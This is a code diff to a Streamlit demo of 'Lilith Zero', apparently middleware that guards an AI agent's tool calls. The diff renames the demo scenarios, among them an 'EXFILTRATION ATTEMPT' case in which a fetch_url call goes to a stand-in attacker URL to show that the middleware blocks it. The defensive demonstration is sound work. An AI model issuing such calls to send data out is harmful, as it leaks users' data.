@@ -104,6 +104,7 @@ st.markdown("""
     }
     
     .status-denied { color: #ff3333; border-left-color: #ff3333; }
+    .status-warning { color: #ffaa00; border-left-color: #ffaa00; }
     .status-allowed { color: #33ff66; border-left-color: #33ff66; }
     .status-info { color: #33ccff; border-left-color: #33ccff; }
 
@@ -198,10 +199,10 @@ with col_main:
     scenario = st.radio(
         "SELECT OPERATIONAL CONTEXT:",
         [
-            "BASELINE_INTERNAL_BYPASS",
+            "WITHOUT LILITH",
             "PROTECTED_RLS_CONTAINMENT",
-            "PROTECTED_EGRESS_CONTROL",
-            "PROTECTED_AUTHORIZED_QUERY"
+            "EXFILTRATION ATTEMPT",
+            "AUTHORIZED QUERY"
         ],
         label_visibility="collapsed"
     )
@@ -218,14 +219,14 @@ with col_main:
             log_placeholder.markdown("".join(steps), unsafe_allow_html=True)
             time.sleep(delay)
 
-        if "BASELINE" in scenario:
+        if "WITHOUT" in scenario:
             log_step("Initializing direct tool access channel...")
             log_step("Bypassing Lilith Zero middleware security...")
             log_step("Establishing connection to legacy upstream server...")
             with output_placeholder:
                 st.markdown(f"""
-                    <div class="output-block status-denied">
-                        <span style='font-size: 0.7rem; font-weight: bold;'>WARNING: SECURITY_DISABLED</span><br>
+                    <div class="output-block status-warning">
+                        <span style='font-size: 0.7rem; font-weight: bold; color: #ffaa00;'>WARNING: SECURITY_DISABLED</span><br>
                         Baseline mode operates outside of the protected security perimeter.
                     </div>
                     <div class="output-block">
@@ -293,9 +294,9 @@ with col_main:
             
             if scenario == "PROTECTED_RLS_CONTAINMENT":
                 loop.run_until_complete(run_op("execute_sql", {"query": "SELECT * FROM users"}))
-            elif scenario == "PROTECTED_EGRESS_CONTROL":
+            elif scenario == "EXFILTRATION ATTEMPT":
                 loop.run_until_complete(run_op("fetch_url", {"url": "http://attacker-controlled.xyz/leak"}))
-            elif scenario == "PROTECTED_AUTHORIZED_QUERY":
+            elif scenario == "AUTHORIZED QUERY":
                 loop.run_until_complete(run_op("execute_sql", {"query": "SELECT COUNT(*) FROM users"}))
             
             loop.close()
